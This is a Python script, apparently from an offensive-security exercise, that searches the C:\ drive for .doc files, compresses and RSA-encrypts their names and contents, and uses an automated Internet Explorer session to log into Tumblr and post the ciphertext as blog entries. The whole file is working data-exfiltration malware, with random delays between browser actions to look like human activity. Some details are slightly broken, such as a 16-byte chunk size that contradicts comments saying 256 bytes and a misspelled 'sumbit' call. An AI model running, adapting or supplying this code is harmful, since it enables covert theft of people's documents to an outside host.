import win32com.client
import os
import fnmatch
import time
import random
import zlib 

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

doc_type = ".doc"

# Tumblr username and password
username = "myusername"
password = "mypassword"

public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1PQTl9ZOby7vRzJrYach
31+9olHTScI7HAuC5XE6wxAyERP4JaSbJRP5WF5VGjZ1SDfBRRA8b0rBPRuYxOjQ
HLnuBtlaERjjcbitPVio7jrAVRlZakaC9ZyVQDOVodpRliBkdU0ZQKPfM7a/M8vk
qi7KqhBUBtB3vA2gC8zQ9dSSs7gFsCxM0Ml/Bqhll2WHxNvmvoOD560fzfcjf6rH
9P0DxDdxJ1DXkxaMrn+uh5fx+OjbsQupVkfxpFFA9xeRX0sy/65OsgVfOM1VSKeG
EKx1YcqJQAAtauXZIGT7QmILSd3vnyO0s8BfwhWaV/w+xBeDnmlU4MBttWA1evdc
RQIDAQAB
-----END PUBLIC KEY-----"""

def wait_for_browser(browser):
    # Wait for the browser to finish loading a page
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)
    return

# Our encryption routines to encrypt the filename and file contents
def encrypt_string(plaintext):
    
    chunk_size = 16
    print "Compressing: %d bytes" % len(plaintext)
    # We apply zlib compression on the string
    plaintext = zlib.compress(plaintext)

    print "Encrypting %d bytes" % len(plaintext)

    rsakey = RSA.importKey(public_key)
    rsakey = PKCS1_OAEP.new(rsakey)

    encrypted = " "
    offset = 0

    # Loops through the string and encrypts it in 256-byte chunks
    while offset < len(plaintext):
        chunk = plaintext[offset:offset+chunk_size]
        # We need to add padding if the last chunk is not 256-byte long
        if len(chunk) % chunk_size != 0:
            chunk += " " * (chunk_size - len(chunk))
        encrypted += rsakey.encrypt(chunk)
        offset += chunk_size
    # Base64 encode the ciphertext string to avoid
    # encoding problem when posting it on Tumblr
    encrypted = encrypted.encode("base64")
    print "Base64 encoded crypto: %d" % len(encrypted)

    return encrypted

def encrypt_post(filename):
    # Open and read the file
    fd = open(filename,"rb")
    contents = fd.read()
    fd.close()

    encrypted_title = encrypt_string(filename)
    encrypted_body = encrypt_string(contents)

    return encrypted_title, encrypted_body

def random_sleep():
    time.sleep(random.randint(5,10))
    return

def login_to_tumblr(ie):    
    # Retrieve all elements in the DOM
    full_doc = ie.Document.all
    
    # Iterate looking for the login form and set them to
    # the credentials we provide
    for i in full_doc:
        if i.id == "signup_email":
            i.setAttribute("value",username)
        elif i.id == "signup_password":
            i.setAttribute("value",password)
    random_sleep()

    # We can be presented with different login screens at each visit
    # We need to find the login form and submit it accordingly
    try:
        if ie.Document.forms[0].id == "signup_form":
            ie.Document.forms[0].sumbit()
        else:
            ie.Document.forms[1].submit()
    except IndexError, e:
        pass
    
    random_sleep()

    # The login form is the second form on the page
    wait_for_browser(ie)
    
    return

def post_to_tumblr(ie, title, post):
    
    full_doc = ie.Document.all

    for i in full_doc:
        if i.id == "post_one":
            i.setAttribute("value", title)
            title_box = i
            i.focus()
        elif i.id == "post_two":
            i.setAttribute("innerHTML", post)
            print "Set text area"
            i.focus()
        elif i.id == "create_post":
            print "Found post button"
            post_form = i
            i.focus()

    # Move the focus way fromt eh main content box. We have to do that
    # because only after that Tumblr's Javascript enables the Post button.
    random_sleep()
    title_box.focus()
    random_sleep()

    # Post the form
    post_form.children[0].click()
    wait_for_browser(ie)

    random_sleep()

    return

def exfiltrate(document_path):
    # Create a new instance of the Internet Exporer COM object
    ie = win32com.client.Dispatch("InternetExplorer.Application")
    # Set the process to be visible with 1
    ie.Visible = 1

    # Head to Tumblr and login
    ie.Navigate("https://www.tumblr.com/login")
    wait_for_browser(ie)
    print "[*] Logging in ..."
    login_to_tumblr(ie)
    print "[*] Logged in ... navigating"

    ie.Navigate("https://www.tumblr.com/new/text")
    
    # Encrypt the file
    title, body = encrypt_post(document_path)

    print title
    print body

    print "[*] Creating new post ..."
    post_to_tumblr(ie, title, body)
    print "[*] Posted!"

    # Destroy the IE instance
    ie.Quit()
    ie = None

# Our main loop for document discovery
for parent, directories, filenames in os.walk("C:\\"):
    for filename in fnmatch.filter(filenames,"*%s" % doc_type):
        document_path = os.path.join(parent, filename)
        print "Found: %s" % document_path
        exfiltrate(document_path)
        raw_input("Continue?") 
    







